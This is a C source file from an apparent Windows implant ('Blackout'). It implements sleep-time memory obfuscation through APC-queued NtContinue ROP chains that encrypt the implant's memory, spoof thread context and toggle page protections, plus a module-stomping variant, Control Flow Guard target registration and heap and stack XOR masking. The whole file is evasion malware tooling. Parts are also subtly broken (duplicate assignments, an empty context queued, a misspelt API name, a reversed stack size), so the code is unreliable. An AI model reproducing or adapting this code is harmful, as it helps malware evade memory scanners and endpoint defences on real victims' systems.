#include <utils.h>
#include <common.h>
#include <constexpr.h>

FUNC VOID volatile ___chkstk_ms(
        VOID
) { __asm__( "nop" ); }

FUNC VOID SleepMain(
    DWORD SleepTime
) {
    FoliageObf( SleepTime );
}
#ifdef BK_STOMP
FUNC VOID FoliageObf( 
    DWORD SleepTime
) {
    BLACKOUT_INSTANCE
    
    LONG   Status     = 0x00;

    HANDLE EvtSync       = NULL;
    HANDLE hDuplicateObj = NULL;
    HANDLE hSlpThread    = NULL;
    HANDLE hMainThread   = NULL;

    CHAR    LibraryFr[]= { 'c', 'h', 'a', 'k', 'r', 'a', '.', 'd', 'l', 'l', 0 }; // todo: string encryption
    HMODULE hLibraryFr = Instance()->Win32.GetModuleHandleA( LibraryFr ); // todo: get module using LdrModuleAddr | discover hash of the chacrka.dll
    PVOID   OldProt    = NULL;

    CONTEXT CtxMain   = { 0 };
    CONTEXT CtxBackup = { 0 };
    CONTEXT CtxSpoof  = { 0 };

    CONTEXT RopSetEvt = { 0 };
    CONTEXT RopFreeLb = { 0 };
    CONTEXT RopLoadLb = { 0 };
    CONTEXT RopDelay  = { 0 };
    CONTEXT RopImpBcp = { 0 };
    CONTEXT RopProtRw = { 0 };
    CONTEXT RopProtRx = { 0 };
    CONTEXT RopProtRx2 = { 0 };
    CONTEXT RopExit   = { 0 };

    Status = Instance()->Win32.NtCreateEvent( &EvtSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );
    if ( Status != 0x00 ) {
        //PrintErr( "NtCreateEvent", Status );
    }    

    Status = Instance()->Win32.NtCreateThreadEx( &hSlpThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL );
    if ( Status != 0x00 ) {
        //PrintErr( "NtCreateThreadEx", Status );
    }

    Instance()->Win32.printf( "[I] Obf chain thread at tid: %d\n", hSlpThread );

    CtxMain.ContextFlags = CONTEXT_FULL;
    Status = Instance()->Win32.NtGetContextThread( hSlpThread, &CtxMain );
    if ( Status != 0x00 ) {
        //PrintErr( "NtGetContextThread", Status );
    }

    *(PVOID*)CtxMain.Rsp = Instance()->Win32.NtTestAlert;

    MmCopy( &RopSetEvt, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopFreeLb, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopLoadLb, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopDelay,  &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopProtRx, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopProtRw, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopImpBcp, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopExit,   &CtxMain, sizeof( CONTEXT ) );

    /* 
     * wait EvtSync gets triggered
     * NtWaitForGingleObject( EvtSync, FALSE, NULL ); 
     */
    RopSetEvt.Rip = Instance()->Win32.NtWaitForSingleObject;
    RopSetEvt.Rcx = EvtSync;
    RopSetEvt.Rdx = FALSE;
    RopSetEvt.R9  = NULL;

    /*
     * Change implant protection to RW
     * VirtualProtect( RxBase, RxSize, PAGE_READWRITE, &OldProt ); 
     */
    //RopFreeLb.Rip = Instance()->Win32.LdrUnloadDll;
    //RopFreeLb.Rcx = hLibraryFr;

    /*
     * memory encryption
     * SystemFunction040( BaseAddress, FullLength );
     */
    RopLoadLb.Rip = Instance()->Win32.LoadLibraryExA;
    RopLoadLb.Rcx = LibraryFr;
    RopLoadLb.Rdx = NULL;
    RopLoadLb.R8  = DONT_RESOLVE_DLL_REFERENCES;

    RopFreeLb.Rip = Instance()->Win32.VirtualProtect;
    RopFreeLb.Rcx = Instance()->Base.RxBase;
    RopFreeLb.Rdx = Instance()->Base.RxSize;
    RopFreeLb.R8  = PAGE_READWRITE;
    RopFreeLb.R9  = &OldProt;

    RopLoadLb.Rip = Instance()->Win32.WriteProcessMemory;
    RopLoadLb.Rcx = NtCurrentProcess(); 
    RopLoadLb.Rdx = Instance()->Base.Buffer;
    RopLoadLb.R8  = Instance()->StompArgs->Backup2;
    RopLoadLb.R9  = Instance()->Base.FullLen;

    /*
     * delay
     * WaitForSingleObjectEx( NtCurrentProcess(), SleepTime, FALSE );
     */
    RopDelay.Rip = Instance()->Win32.WaitForSingleObjectEx;
    RopDelay.Rcx = NtCurrentProcess();
    RopDelay.Rdx = 50 * 1000;
    RopDelay.R8  = FALSE;

    RopProtRw.Rip = Instance()->Win32.VirtualProtect;
    RopProtRw.Rcx = Instance()->Base.Buffer;
    RopProtRw.Rdx = Instance()->Base.FullLen;
    RopProtRw.R8  = PAGE_READWRITE;
    RopProtRw.R9  = &OldProt; 

    /*
     * memory decryption
     * SystemFunction041( BaseAddress, FullLength );
     */
    RopImpBcp.Rip = Instance()->Win32.WriteProcessMemory;
    RopImpBcp.Rcx = NtCurrentProcess();
    RopImpBcp.Rdx = Instance()->Base.Buffer;
    RopImpBcp.R8  = Instance()->StompArgs->Backup;
    RopImpBcp.R9  = Instance()->StompArgs->Length;

    RopProtRx.Rip = Instance()->Win32.VirtualProtect;
    RopProtRx.Rcx = Instance()->Base.RxBase;
    RopProtRx.Rdx = Instance()->Base.RxSize;
    RopProtRx.R8  = PAGE_EXECUTE_READ;
    RopProtRx.R9  = &OldProt;
    
    /*
     * exit thread
     * RtlExitUserThread( 0x00 );
     */
    RopExit.Rip = Instance()->Win32.RtlExitUserThread;
    RopExit.Rcx = 0x00;

    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopSetEvt, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopFreeLb, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopLoadLb, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRx2, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopDelay , FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRw, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopImpBcp, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRx, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopExit  , FALSE, NULL );

    Status = Instance()->Win32.NtAlertResumeThread( hSlpThread, NULL );
    if ( Status != 0x00 ) {
        //PrintErr( "NtAlertResumeThread", Status );
    }

    //CtxSpoof.Rip = Instance()->Win32.WaitForSingleObjectEx;
    //CtxSpoof.Rsp = Instance()->Teb->NtTib.StackBase;

    Instance()->Win32.printf( "[I] Trigger sleep obf chain\n\n" );

    Status = Instance()->Win32.NtSignalAndWaitForSingleObject( EvtSync, hSlpThread, FALSE, NULL );
    if ( Status != 0x00 ) {
        //PrintErr( "NtSignalAndWaitForSingleObject", Status );
    }

_LeaveObf:
    if ( EvtSync ) {
        Instance()->Win32.CloseHandle( EvtSync );
        EvtSync = NULL;
    }

    if ( hSlpThread ) {
        Instance()->Win32.CloseHandle( hSlpThread );
        hSlpThread = NULL;
    }
}    
#else

FUNC VOID FoliageObf( 
    DWORD SleepTime
) {
    BLACKOUT_INSTANCE
    
    LONG   Status     = 0x00;

    HANDLE EvtSync       = NULL;
    HANDLE hDuplicateObj = NULL;
    HANDLE hSlpThread    = NULL;
    HANDLE hMainThread   = NULL;

    PVOID  OldProt    = NULL;
    PVOID  Heap       = Instance()->Session.Heap;

    CONTEXT CtxMain   = { 0 };
    CONTEXT CtxBackup = { 0 };
    CONTEXT CtxSpoof  = { 0 };

    CONTEXT RopSetEvt = { 0 };
    CONTEXT RopProtRw = { 0 };
    CONTEXT RopMemEnc = { 0 };
    CONTEXT RopGetCtx = { 0 };
    CONTEXT RopSetCtx = { 0 };
    CONTEXT RopDelay  = { 0 };
    CONTEXT RopMemDec = { 0 };
    CONTEXT RopProtRx = { 0 };
    CONTEXT RopFixCtx = { 0 }; 
    CONTEXT RopExit   = { 0 };

    typedef NTSTATUS (NTAPI *fNtSignalAndWaitForSingleObject)(
        HANDLE SignalHandle, HANDLE WaitHandle, 
        BOOLEAN Alertable, PLARGE_INTEGER Timeout
    );

    typedef WINBOOL (*fCloseHandle)( HANDLE hObject );

    fNtSignalAndWaitForSingleObject pNtSignalAndWaitForSingleObject = LdrFuncAddr( LdrModuleAddr( H_MODULE_NTDLL ), HASH_STR( "NtSignalAndWaitForSingleObject" ) );
    fCloseHandle pCloseHandle = LdrFuncAddr( LdrModuleAddr( H_MODULE_KERNEL32 ), HASH_STR( "CloseHandle" ) );

    Status = Instance()->Win32.NtCreateEvent( &EvtSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );
    if ( Status != 0x00 )  { __debugbreak; return; }

    Instance()->Win32.DuplicateHandle( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &hDuplicateObj, THREAD_ALL_ACCESS, 0, 0 );

    Status = Instance()->Win32.NtCreateThreadEx( &hSlpThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL );
    if ( Status != 0x00 ) { __debugbreak; return; }

    Instance()->Win32.printf( "[I] Obf chain thread at tid: %d\n", hSlpThread );

    CtxMain.ContextFlags = CONTEXT_FULL;
    Status = Instance()->Win32.NtGetContextThread( hSlpThread, &CtxMain );
    if ( Status != 0x00 ) { __debugbreak; return; }

    *(PVOID*)CtxMain.Rsp = Instance()->Win32.NtTestAlert;

    MmCopy( &RopSetEvt, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopProtRw, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopMemEnc, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopGetCtx, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopSetCtx, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopDelay,  &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopMemDec, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopProtRx, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopFixCtx, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopExit,   &CtxMain, sizeof( CONTEXT ) );

    /* 
     * wait EvtSync gets triggered
     * NtWaitForGingleObject( EvtSync, FALSE, NULL ); 
     */
    RopSetEvt.Rip = Instance()->Win32.NtWaitForSingleObject;
    RopSetEvt.Rcx = EvtSync;
    RopSetEvt.Rdx = FALSE;
    RopSetEvt.R9  = NULL;

    /*
     * Change implant protection to RW
     * VirtualProtect( RxBase, RxSize, PAGE_READWRITE, &OldProt ); 
     */
    RopProtRw.Rip = Instance()->Win32.VirtualProtect;
    RopProtRw.Rcx = Instance()->Base.RxBase;
    RopProtRw.Rdx = Instance()->Base.RxSize;
    RopProtRw.R8  = PAGE_READWRITE;
    RopProtRw.R9  = &OldProt;

    /*
     * memory encryption
     * SystemFunction040( BaseAddress, FullLength );
     */
    RopMemEnc.Rip = Instance()->Win32.SystemFunction040;
    RopMemEnc.Rcx = Instance()->Base.Buffer;
    RopMemEnc.Rdx = Instance()->Base.FullLen;

    /* stack duplication
     * NtGetContextThread( hDuplicateObj, CtxBackup );
     */
    RopGetCtx.Rip = Instance()->Win32.NtGetContextThread;
    RopGetCtx.Rcx = hDuplicateObj;
    RopGetCtx.Rdx = &CtxBackup;

    /*
     * 
     * NtSetContextThread( hDuplicateObj. CtxSpoof );
     */
    RopSetCtx.Rip = Instance()->Win32.NtSetContextThread;
    RopSetCtx.Rcx = hDuplicateObj;
    RopSetCtx.Rdx = &CtxSpoof;

    /*
     * delay
     * WaitForSingleObjectEx( NtCurrentProcess(), SleepTime, FALSE );
     */
    RopDelay.Rip = Instance()->Win32.WaitForSingleObjectEx;
    RopDelay.Rcx = NtCurrentProcess();
    RopDelay.Rdx = SleepTime;
    RopDelay.R8  = FALSE;

    /*
     * memory decryption
     * SystemFunction041( BaseAddress, FullLength );
     */
    RopMemDec.Rip = Instance()->Win32.SystemFunction041;
    RopMemDec.Rcx = Instance()->Base.Buffer;
    RopMemDec.Rdx = Instance()->Base.FullLen;

    /*
     * 
     * NtSetContextThread( hDuplicateObj, &CtxBackup );
     */

    RopFixCtx.Rip = Instance()->Win32.NtSetContextThread;
    RopFixCtx.Rcx = hDuplicateObj;
    RopFixCtx.Rdx = &CtxBackup;

    /*
     * change memory to execute and read
     * VirtualProtect( RxBase, RxSize, PAGE_EXECUTE_READ, &oldProt );
     */
    RopProtRx.Rip = Instance()->Win32.VirtualProtect;
    RopProtRx.Rcx = Instance()->Base.RxBase;
    RopProtRx.Rdx = Instance()->Base.RxSize;
    RopProtRx.R8  = PAGE_EXECUTE_READ;
    RopProtRx.R9  = &OldProt;

    /*
     * exit thread
     * RtlExitUserThread( 0x00 );
     */
    RopExit.Rip = Instance()->Win32.RtlExitUserThread;
    RopExit.Rcx = 0x00;

    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopSetEvt, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRw, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopMemEnc, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopGetCtx, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopSetCtx, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopDelay , FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopMemDec, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRx, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopFixCtx, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopExit  , FALSE, NULL );

    Status = Instance()->Win32.NtAlertResumeThread( hSlpThread, NULL );
    if ( Status != 0x00 ) { __debugbreak; return; }
    Instance()->Win32.printf( "[I] Trigger sleep obf chain\n\n" );

    HeapObf( Heap );

    Status = pNtSignalAndWaitForSingleObject( EvtSync, hSlpThread, FALSE, NULL );
    if ( Status != 0x00 ) { __debugbreak; return; }

    HeapObf( Heap );

_LeaveObf:
    if ( EvtSync ) {
        Instance()->Win32.CloseHandle( EvtSync );
        EvtSync = NULL;
    }

    if ( hSlpThread ) {
        Instance()->Win32.CloseHandle( hSlpThread );
        hSlpThread = NULL;
    }
}    

#endif

FUNC BOOL CfgCheckEnabled(
    VOID
) {
    BLACKOUT_INSTANCE

    NTSTATUS Status = STATUS_SUCCESS;
    EXTENDED_PROCESS_INFORMATION ProcInfoEx = { 0 };

    ProcInfoEx.ExtendedProcessInfo       = ProcessControlFlowGuardPolicy;
    ProcInfoEx.ExtendedProcessInfoBuffer = 0;
    
    Status = Instance()->Win32.NtQueryInformationProcess( 
        NtCurrentProcess(),
        ProcessCookie | ProcessUserModeIOPL,
        &ProcInfoEx,
        sizeof( ProcInfoEx ),
        NULL
    );
    if ( Status != STATUS_SUCCESS ) {
        Instance()->Win32.printf( "[E] failed with status: %X\n", Status );
    }

    Instance()->Win32.printf( "[I] Control Flow Guard (CFG) Enabled: %s\n", ProcInfoEx.ExtendedProcessInfoBuffer ? "TRUE" : "FALSE" );
    return ProcInfoEx.ExtendedProcessInfoBuffer;
}

FUNC VOID CfgAddressAdd( 
    _In_ PVOID ImageBase,
    _In_ PVOID Function
) {
    BLACKOUT_INSTANCE

    CFG_CALL_TARGET_INFO Cfg      = { 0 };
    MEMORY_RANGE_ENTRY   MemRange = { 0 };
    VM_INFORMATION       VmInfo   = { 0 };
    PIMAGE_NT_HEADERS    NtHdrs   = { 0 };
    ULONG                Output   = 0x00;
    NTSTATUS             Status   = STATUS_SUCCESS;

    NtHdrs                  = C_PTR( ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew );
    MemRange.NumberOfBytes  = U_PTR( NtHdrs->OptionalHeader.SizeOfImage + 0x1000 - 1 ) &~( 0x1000 - 1 );
    MemRange.VirtualAddress = ImageBase;

    Cfg.Flags  = CFG_CALL_TARGET_VALID;
    Cfg.Offset = U_PTR( Function ) - U_PTR( ImageBase );

    VmInfo.dwNumberOfOffsets = 1;
    VmInfo.plOutput          = &Output;
    VmInfo.ptOffsets         = &Cfg;
    VmInfo.pMustBeZero       = FALSE;
    VmInfo.pMoarZero         = FALSE;

    Status = Instance()->Win32.NtSetInformationVirtualMemory( 
        NtCurrentProcess(),
        VmCfgCallTargetInformation,
        1,
        &MemRange,
        &VmInfo,
        sizeof( VmInfo )
    );

    if ( Status != STATUS_SUCCESS ) {
        Instance()->Win32.printf( "[E] failed with status: %X", Status );
    }
}

FUNC VOID CfgPrivateAddressAdd(
    _In_ HANDLE hProcess,
    _In_ PVOID  Address,
    _In_ DWORD  Size
) {
    BLACKOUT_INSTANCE

    CFG_CALL_TARGET_INFO Cfg      = { 0 };
    MEMORY_RANGE_ENTRY   MemRange = { 0 };
    VM_INFORMATION       VmInfo   = { 0 };
    PIMAGE_NT_HEADERS    NtHeader = { 0 };
    ULONG                Output   = { 0 };
    NTSTATUS             Status   = { 0 };

    MemRange.NumberOfBytes  = Size;
    MemRange.VirtualAddress = Address;
    
    Cfg.Flags  = CFG_CALL_TARGET_VALID;
    Cfg.Offset = 0;

    VmInfo.dwNumberOfOffsets = 1;
    VmInfo.plOutput          = &Output;
    VmInfo.ptOffsets         = &Cfg;
    VmInfo.pMustBeZero       = FALSE;
    VmInfo.pMoarZero         = FALSE;

    Status = Instance()->Win32.NtSetInformationVirtualMemory( 
        hProcess, 
        VmCfgCallTargetInformation, 
        1, 
        &MemRange, 
        &VmInfo, 
        sizeof( VmInfo ) 
    );

    if ( Status != STATUS_SUCCESS ) {
        Instance()->Win32.printf( "[E] failed with status: %X", Status );
    }
}

FUNC VOID XorCipher(
    _In_ PBYTE  pBinary, 
    _In_ UINT64 sSize, 
    _In_ PBYTE  pbKey, 
    _In_ UINT64 sKeySize
) {
    for (SIZE_T i = 0x00, j = 0x00; i < sSize; i++, j++) {
        if (j == sKeySize)
            j = 0x00;

        if (i % 2 == 0)
            pBinary[i] = pBinary[i] ^ pbKey[j];
        else
            pBinary[i] = pBinary[i] ^ pbKey[j] ^ j;
    }
}

FUNC VOID HeapObf( 
    PVOID Heap
) {
    BLACKOUT_INSTANCE

    PROCESS_HEAP_ENTRY HeapEntry   = { 0 };
    BYTE               HeapKey[16] = { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };

    MmZero( &HeapEntry, sizeof( PROCESS_HEAP_ENTRY ) );

    typedef WINBOOL (*fHeapWalk)(HANDLE hHeap, LPPROCESS_HEAP_ENTRY lpEntry);
    fHeapWalk pHeapWalk = LdrFuncAddr( LdrModuleAddr( H_MODULE_KERNEL32 ), HASH_STR( "HeapWWalk" ) );

    pHeapWalk( Heap, &HeapEntry );
    if ( HeapEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) {
        XorCipher( HeapEntry.lpData, HeapEntry.cbData, HeapKey, sizeof(HeapKey) );
    }
}

FUNC VOID StackObf(
    VOID
) {
    BLACKOUT_INSTANCE

    BYTE   StackKey[16] = { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };

    PVOID  StackBase  = Instance()->Teb->NtTib.StackBase;
    PVOID  StackLimit = Instance()->Teb->NtTib.StackLimit;
    UINT64 StackSize  = C_U64( StackLimit - C_U64( StackBase ) );

    XorCipher( StackBase, StackSize, StackKey, sizeof( StackKey ) );
}